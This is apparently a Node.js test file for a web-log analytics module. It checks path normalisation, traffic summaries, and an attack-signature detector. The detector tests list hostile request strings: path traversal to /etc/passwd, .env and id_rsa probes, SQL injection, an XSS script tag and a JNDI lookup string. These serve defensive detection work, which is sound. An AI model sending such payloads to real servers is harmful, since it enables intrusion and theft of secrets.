const { test } = require('node:test');
const assert = require('node:assert/strict');

const RequestPaths = require('../../frontend/public/js/request-paths.js');

test('one resource has one path, whatever the spelling', () => {
    for (const url of ['/index.html', '//index.html', '/./index.html', '/index.html/', '/index%2Ehtml', '/index.html?x=1', '/index.html#top',
        '/index.html;jsessionid=1', 'http://example.com/index.html', '/a/../index.html']) {
        assert.equal(RequestPaths.normalizePath(url), '/index.html', url);
    }
    assert.equal(RequestPaths.normalizePath('/INDEX.html'), '/INDEX.html', 'case is kept');
    assert.equal(RequestPaths.normalizePath('/a%2Fb'), '/a%2Fb', 'an encoded slash is not a separator');
    assert.equal(RequestPaths.normalizePath('/'), '/');
    assert.equal(RequestPaths.normalizePath('/~alice/caf%c3%a9'), '/~alice/caf%C3%A9');
    assert.equal(RequestPaths.normalizePath('-'), '');
    assert.equal(RequestPaths.normalizePath(null), '');
});

test('sections are the first level of the path', () => {
    assert.equal(RequestPaths.sectionOf('/static/app.js?v=1'), '/static');
    assert.equal(RequestPaths.sectionOf('/about'), '/about');
    assert.equal(RequestPaths.sectionOf('/'), '/');
});

test('every request is counted once', () => {
    const urls = [['/api/v1/users/123', 10], ['/a/a/a', 10], ['/', 10], ['/admin', 5], ['/blog/admin', 5], ['/admin/', 5]];
    const out = RequestPaths.summarize(urls, 45);
    const counts = Object.fromEntries(out.top_paths.map(p => [p.path, p.count]));
    assert.deepEqual(counts, { '/api/v1/users/123': 10, '/a/a/a': 10, '/': 10, '/admin': 10, '/blog/admin': 5 });
    assert.equal(out.top_paths.reduce((sum, p) => sum + p.count, 0) + out.other_paths.count, 45);
    assert.equal(out.distinct_paths, 5);
    const sections = Object.fromEntries(out.sections.map(p => [p.path, p.count]));
    assert.deepEqual(sections, { '/api': 10, '/a': 10, '/': 10, '/admin': 10, '/blog': 5 });
});

test('paths past the limit are reported as "other"', () => {
    const urls = Array.from({ length: 40 }, (_, i) => [`/p${i}`, 40 - i]);
    const total = urls.reduce((sum, u) => sum + u[1], 0);
    const out = RequestPaths.summarize(urls, total, { paths: 30 });
    assert.equal(out.top_paths.length, 30);
    assert.equal(out.other_paths.paths, 10);
    assert.equal(out.top_paths.reduce((sum, p) => sum + p.count, 0) + out.other_paths.count, total);
});

test('the path filter counts what the tables count', () => {
    const urls = ['/products', '/products/1', '/products/1?ref=x', '/search?q=/products', '/productsx'];
    const count = filter => urls.filter(RequestPaths.pathMatcher(filter)).length;
    assert.equal(count('=/products'), 1, 'exact path');
    assert.equal(count('=/products/1'), 2, 'exact path ignores the query');
    assert.equal(count('^/products'), 3, 'section');
    assert.equal(count('/products'), 5, 'plain text is found anywhere');
    assert.equal(count(''), 5);
});

test('attack paths are recognised when encoded or in the query string', () => {
    const strong = [
        '/.env', '/%2eenv', '/.%67it/config', '/wp%2dconfig.php', '/%252e%252e/%252e%252e/etc/passwd',
        '/?file=../../../../etc/passwd', '/download?f=../.env', '/x?u=/proc/self/environ',
        '/..%2f..%2f..%2fetc%2fpasswd', '/cgi-bin/.%2e/.%2e/.%2e/bin/sh',
        "/item?id=1'+UNION+SELECT+1,2,3--", '/search?q=<script>alert(1)</script>', '/p?x=${jndi:ldap://e.x/a}', '/a?b=1%20OR%201=1',
        '/backup.sql', '/db.sql.gz', '/server-status', '/shell.php', '/web.config', '/id_rsa', '/site.zip',
    ];
    for (const url of strong) {
        const sig = RequestPaths.attackSignature(url);
        assert.ok(sig && sig.strong, `expected a strong signature for ${url}`);
    }
    for (const url of ['/wp-login.php', '/xmlrpc.php', '/phpmyadmin/', '/admin.php']) {
        const sig = RequestPaths.attackSignature(url);
        assert.ok(sig && !sig.strong, `expected a weak signature for ${url}`);
    }
});

test('WordPress entry points, and the dashboard pages that show a logged-in user', () => {
    for (const url of ['/wp-login.php', '/wp-login.php?action=logout', '/blog/xmlrpc.php', '/xmlrpc.php?rsd', '/wp-includes/wlwmanifest.xml']) {
        assert.ok(RequestPaths.isWordPressEntry(url), url);
    }
    for (const url of ['/wp-admin/', '/login.php', '/wlwmanifest.xml.bak', '/my-xmlrpc.php']) assert.ok(!RequestPaths.isWordPressEntry(url), url);

    for (const url of ['/wp-admin/', '/wp-admin', '/wp-admin/index.php', '/blog/wp-admin/post.php?post=3&action=edit', '/wp-admin/network/sites.php']) {
        assert.ok(RequestPaths.isWordPressDashboard(url), url);
    }
    // These answer anyone, logged in or not.
    const open = [
        '/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php', '/wp-admin/install.php', '/wp-admin/setup-config.php', '/wp-admin/load-styles.php?c=1',
        '/wp-admin/load-scripts.php', '/wp-admin/upgrade.php', '/wp-admin/maint/repair.php', '/wp-admin/css/login.min.css', '/wp-admin/js/common.js',
        '/wp-administrator/', '/not-wp-admin/index.php', '/wp-login.php',
    ];
    for (const url of open) assert.ok(!RequestPaths.isWordPressDashboard(url), url);
});

test('ordinary requests are not attack paths', () => {
    const ordinary = [
        '/', '/products/shoes/42', '/search?q=union+jobs+select+committee', '/blog/how-to-select-from-a-table',
        '/static/app.js?v=1.2.3', '/docs/backup-guide.html', '/download/site-report.zip', '/search?q=o%27reilly',
        '/a?redirect=https://x.test/y', '/img/photo (1).jpg', '/health', '/admin/users', '/user/login', '/files/data.old.html',
        '/shop?price=10|20', '/q?a=1;id=2', '/wiki/C++', '/search?q=cat+food', '/path/~user/file', '/api/v1/items?filter=a%20and%20b',
    ];
    for (const url of ordinary) assert.equal(RequestPaths.attackSignature(url), null, url);
});

test('pages, assets and downloads are told apart', () => {
    assert.equal(RequestPaths.resourceKind('/static/app.js?v=3'), 'asset');
    assert.equal(RequestPaths.resourceKind('/img/a.PNG'), 'asset');
    assert.equal(RequestPaths.resourceKind('/video/seg12.ts'), 'media');
    assert.equal(RequestPaths.resourceKind('/docs/manual.pdf'), 'media');
    assert.equal(RequestPaths.resourceKind('/api/items.json'), 'page');
    assert.equal(RequestPaths.resourceKind('/products/1'), 'page');
});

test('login attempts', () => {
    assert.ok(RequestPaths.isAuthRequest('POST', '/login'));
    assert.ok(RequestPaths.isAuthRequest('POST', '/wp-login.php'));
    assert.ok(RequestPaths.isAuthRequest('POST', '/api/v1/auth/token'));
    assert.ok(RequestPaths.isAuthRequest('POST', '/users/sign_in'));
    assert.ok(RequestPaths.isAuthRequest('GET', '/login?user=admin&pass=x'));
    assert.ok(!RequestPaths.isAuthRequest('GET', '/login'));
    assert.ok(!RequestPaths.isAuthRequest('POST', '/wp-admin/admin-ajax.php'));
    assert.ok(!RequestPaths.isAuthRequest('POST', '/blog/login-tips'));
});

test('the site of a referrer', () => {
    const site = RequestPaths.referrerSite;
    assert.equal(site('https://www.Example.com:443/a/b?c=1#d'), 'www.example.com');
    assert.equal(site('http://example.com'), 'example.com');
    assert.equal(site('https://example.com./'), 'example.com');
    assert.equal(site('https://user:secret@site.test:8080/x'), 'site.test');
    assert.equal(site('http://[2001:db8::1]:8080/x'), '[2001:db8::1]');
    assert.equal(site('android-app://com.google.android.gm/'), 'com.google.android.gm');
    assert.equal(site('//cdn.test/x'), 'cdn.test');
    assert.equal(site('example.org/page'), 'example.org');
    for (const none of ['-', '', ' ', '/local/path', null, undefined]) assert.equal(site(none), '', String(none));
});
